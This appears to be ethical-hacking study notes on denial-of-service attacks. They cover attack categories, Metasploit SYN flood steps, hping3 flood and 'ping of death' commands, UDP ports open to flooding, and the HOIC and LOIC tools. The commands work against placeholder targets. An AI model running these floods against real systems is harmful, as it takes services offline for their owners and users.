# DENIAL OF SERVICE (DoS)
In a DoS attack, attackers flood a victim’s system with nonlegitimate service requests or traffic to overload its resources, ideally bringing the system down and leading to the unavailability of the victim’s website.<br>
## DoS ATTACKS ARE OF 3 MAIN TYPES
* Volumetric attacks: populate the bandwidth of the target network.
  Techniques:
  * UDP flood
  * ICMP flood
  * Ping of death and smurf attack
  * Pulse wave and zero-day attacks
* Protocol attacks: populate resources like connection state tables in network infrastructures like firewalls, load balancers, servers etc.
  Techniques:
  * SYN flood attack
  * Fragmentation attack
  * spoofed session flood attack
  * ACK flood attack
* Application layer attacks
  Techniques:
  * HTTP GET/POST attack
  * Slowloris attack
  * UDP application layer flood

## PERFORMING SYN FLOODING ATTACK USING METASPLOIT
1. check if the desired port is open (21 in this case) using: ```nmap -p 21 <target IP(s)>```
2. start metasploit by entering the command ```msfconsole```
3. load the auxiliary module 'synflood' using: ```use auxiliary/tcp/synflood```
4. configure the target:
5. set RHOST <target IP>
6. set RPORT <target port>
7. start the DoS attack by entering ```exploit```<br>
![image](https://user-images.githubusercontent.com/56624593/151600090-ac45d3d0-678c-42cf-8e6f-fe825cea400d.png)<br>

## PERFORM DoS ATTACK USING hping3
### Simple Flood
```hping3 -S <Target IP Address> -p <target port> --flood```<br>
![image](https://user-images.githubusercontent.com/56624593/151600747-dbe8a365-2cfc-41a0-a982-834a29516b09.png)<br>

### Ping Of Death
```hping3 -d 65538 -S -p <target port> --flood <Target IP Address>```<br>
In a ping of Death attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command.<br>
![image](https://user-images.githubusercontent.com/56624593/151601076-47ece7df-a4b3-459b-880b-3da7f240d7e3.png)<br>
the attacker sends a packet that has a size of 65,538 bytes to the target web server. This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes. The receiving system’s reassembly process might cause the system to crash.<br>

### UDP application layer flood
we will use NetBIOS port 139 to perform a UDP application layer flood attack.<br>
``` hping3 -2 -p 139 --flood <Target IP Address>```<br>
![image](https://user-images.githubusercontent.com/56624593/151601639-5ad9e79b-84da-4a3e-acf9-3538e8418aa3.png)<br>
some UDP based application layer protocols that can be flooded:<br>
CharGEN (Port 19), SNMPv2 (Port 161), QOTD (Port 17), RPC (Port 135), SSDP (Port 1900), CLDAP (Port 389), TFTP (Port 69), NetBIOS (Port 137,138,139), NTP (Port 123), Quake Network Protocol (Port 26000), VoIP (Port 5060).

## DDoS ATTACKS USING TOOLS LIKE HOIC AND LOIC
When a large number of devices perform a DoS attack on a victim, it is called a Distributed DoS (DDoS) attack.<br>
HOIC (High Orbit Ion Cannon) and LOIC (Low orbit Ion Cannon) are GUI based tools that are used to perform DOS, DDOS attacks on targets.<br>
HOIC can target multiple targets (up to 256) at once, while LOIC is focussed more towards attacking web based applications and IPs.

